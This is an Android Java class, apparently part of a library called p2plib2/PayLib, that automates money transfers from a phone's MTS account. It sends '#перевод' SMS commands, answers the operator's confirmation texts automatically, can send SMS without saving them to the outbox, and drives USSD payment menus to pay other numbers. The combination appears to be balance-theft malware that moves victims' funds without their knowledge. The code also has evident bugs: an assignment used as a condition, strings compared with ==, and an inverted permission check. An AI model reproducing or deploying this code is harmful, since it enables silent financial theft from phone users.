package com.example.p2plib2.operators;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;

import com.example.p2plib2.Constants;
import com.example.p2plib2.Logger;
import com.example.p2plib2.PayLib;
import com.example.p2plib2.ussd.USSDController;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;

import static com.example.p2plib2.PayLib.flagok;

public class MTS {
    public static String result = "";
    public static Boolean flag = false;
    private String number;
    private String sum;
    private Boolean sendWithSaveOutput;
    public Boolean sendWithSaveInput;
    private Context cnt;

    public MTS(String number, String sum, Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Context cnt) {
        this.number = number;
        this.sum = sum;
        this.sendWithSaveOutput = sendWithSaveOutput;
        this.sendWithSaveInput = sendWithSaveInput;
        this.cnt = cnt;
    }

    public MTS(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Context cnt) {
        this.sendWithSaveOutput = sendWithSaveOutput;
        this.sendWithSaveInput = sendWithSaveInput;
        this.cnt = cnt;
    }

    public String sendSMS() {
        String msg = "#перевод " + sum;
        Logger.lg("перевод ");
        if (msg != null) {
            SmsManager smsManager = SmsManager.getDefault();
            if (sendWithSaveOutput) {
                smsManager.sendTextMessage("+7"+number, null, msg, null, null);
            } else {
                if (ActivityCompat.checkSelfPermission(cnt, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED
                        && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    smsManager.sendTextMessageWithoutPersisting(number, null, msg, null, null);
                }
            }
        }
        return msg;
    }

    public void sendAnswer(String mts_SMS, String sms_body) {
        Logger.lg("I receive! sms_body "  + sms_body);
        if (sms_body.contains("отправьте")) {
            SmsManager smsManager = SmsManager.getDefault();
            if (sendWithSaveOutput) {
                smsManager.sendTextMessage(mts_SMS, null, "1", null, null);
            } else {
                if (ActivityCompat.checkSelfPermission(cnt, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED
                        && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    smsManager.sendTextMessageWithoutPersisting(mts_SMS, null, "1", null, null);
                }
            }
        } else {
            Logger.lg("Error! " + sms_body);
            PayLib.getSMSResult(sms_body);
        }
    }

    //ussd_mts_target,ussd_mts, sum, operDestination, act);
    public void sendUssd(String ussd_mts, final String number, final String sum, final String destOper, Activity act) {
        Logger.lg("Flagok " + flagok);
        if (flagok = true) {
            final USSDController ussdController = USSDController.getInstance(act);
            ussdController.cleanCallbackMessage();
            HashMap map = new HashMap<>();
            map.put("KEY_LOGIN", new HashSet<>(Arrays.asList("подождите", "загрузка")));
            map.put("KEY_ERROR", new HashSet<>(Arrays.asList("problema", "problem", "ошибка", "null")));
            Logger.lg("Send ussd mts");
            ussdController.callUSSDInvoke(ussd_mts, map, new USSDController.CallbackInvoke() {
                @Override
                public void responseInvoke(String message) {
                    //   Logger.lg("Case 1 " + message);
                    if (message.contains("1>Мобильный телефон")) {
                        Logger.lg("Мобильный");
                        ussdController.send("1", new USSDController.CallbackMessage() {
                            @Override
                            public void responseMessage(String message) {
                                if (message.contains("1>Оплатить МТС") && destOper == "MTS") {
                                    Logger.lg("МТС");
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                                if (destOper == "Beeline") {
                                    Logger.lg("Beeline");
                                    ussdController.send("2", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                                if (destOper == "Megafon") {
                                    Logger.lg("МТС");
                                    ussdController.send("3", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                                if (destOper == "Tele2") {
                                    Logger.lg("Tele2");
                                    ussdController.send("4", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                            }
                        });
                    }
                    if (destOper == "MTS") {
                        if (message.contains("2>Другой номер МТС")) {
                            Logger.lg("Другой");
                            ussdController.send("2", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Номер телефона")) {
                                        Logger.lg("Номер телефона " + number);
                                        ussdController.send(number, new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {

                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("Сумма платежа")) {
                            Logger.lg("Сумма платежа");
                            ussdController.send(sum, new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("счет МТС")) {
                                        Logger.lg("счет МТС");
                                        ussdController.send("1", new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {

                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("счет МТС")) {
                            Logger.lg("счет МТС");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {

                                }
                            });
                        }
                        if (message.contains("Сумма к оплате")) {
                            Logger.lg("Сумма платежа");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                }
                            });
                        }

                    }
                    if (destOper == "Beeline") {
                        if (message.contains("Номер телефона")) {
                            Logger.lg("Номер телефона");
                            ussdController.send(number, new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Сумма платежа")) {
                                        Logger.lg("Сумма платежа");
                                        ussdController.send(sum, new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("счет МТС")) {
                            Logger.lg("счет МТС");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Комиссия") || message.contains("Сумма к оплате")) {
                                        Logger.lg("Комиссия");
                                        ussdController.send("1", new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                    }
                    if (destOper == "Megafon") {
                        if (message.contains("Номер телефона")) {
                            Logger.lg("Номер телефона");
                            ussdController.send(number, new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Сумма платежа")) {
                                        Logger.lg("Сумма платежа");
                                        ussdController.send(sum, new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("счет МТС")) {
                            Logger.lg("счет МТС");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Сумма к")) {
                                        Logger.lg("Сумма к ");
                                        ussdController.send("1", new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                    }
                    if (destOper == "Tele2") {
                        if (message.toLowerCase().contains("tele2")) {
                            Logger.lg("tele2");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("Номер телефона")) {
                                        Logger.lg("Номер телефона");
                                        ussdController.send(number, new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("Сумма") && !message.contains("Комиссия")) {
                            Logger.lg("Сумма");
                            ussdController.send(sum, new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                    if (message.contains("счет МТС")) {
                                        Logger.lg("счет МТС");
                                        ussdController.send("1", new USSDController.CallbackMessage() {
                                            @Override
                                            public void responseMessage(String message) {
                                            }
                                        });
                                    }
                                }
                            });
                        }
                        if (message.contains("Комиссия")) {
                            Logger.lg("Комиссия");
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {

                                }
                            });
                        }
                    }
                }

                @Override
                public void over(String message) {
                    PayLib.flagok = false;
                    result = message;
                    // message has the response string data from USSD
                    // response no have input text, NOT SEND ANY DATA
                }
            });
        }
    }
}
